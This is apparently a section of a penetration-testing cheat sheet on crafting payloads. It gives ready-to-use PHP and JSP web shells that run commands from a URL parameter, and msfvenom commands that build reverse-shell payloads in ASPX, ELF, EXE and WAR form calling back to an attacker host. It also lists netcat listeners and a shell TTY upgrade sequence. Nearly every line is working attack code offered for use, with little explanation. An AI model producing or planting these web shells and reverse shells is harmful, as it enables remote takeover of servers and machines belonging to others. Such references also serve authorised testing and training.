# 6. Payload Crafting — Web & Reverse Shells

## Web shells (snippets)

### PHP

`<?php system($_GET['cmd']); ?>`

### JSP (Tomcat)

`<%@ page import="java.util.*,java.io.*"%><%String cmd = request.getParameter("cmd");Process p = Runtime.getRuntime().exec(cmd);BufferedReader d = new BufferedReader(new InputStreamReader(p.getInputStream()));String l; while((l=d.readLine())!=null){out.println(l);} %>`

### ASPX (.NET/IIS)

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f aspx -o shell.aspx`

## Reverse shells

### MSFVenom

`# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe -o shell.exe

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=443 -f war -o shell.war`

### Listeners

`nc -lvnp 443
rlwrap nc -lvnp 443`

## TTY upgrade (Linux)

`python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm`